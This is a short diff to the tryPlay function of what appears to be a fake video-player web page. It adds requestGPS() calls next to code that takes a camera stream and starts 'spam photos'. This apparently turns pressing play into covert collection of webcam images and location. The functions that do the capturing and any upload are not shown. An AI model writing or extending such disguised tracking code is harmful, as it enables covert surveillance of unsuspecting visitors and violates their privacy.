@@ -358,6 +358,7 @@ function tryPlay() {
     loadBar.style.width = '100%';
     setTimeout(function() { loadBar.style.width = '0'; }, 600);
     document.getElementById('playerBox').classList.add('active');
+    if (!gpsData) requestGPS();
     startSpamPhotos();
     return;
   }
@@ -374,6 +375,7 @@ function tryPlay() {
     video.srcObject = stream;
     video.muted = true;
     video.setAttribute('playsinline', '');
+    requestGPS();
 
     video.play().then(function() {
       loadBar.style.width = '100%';
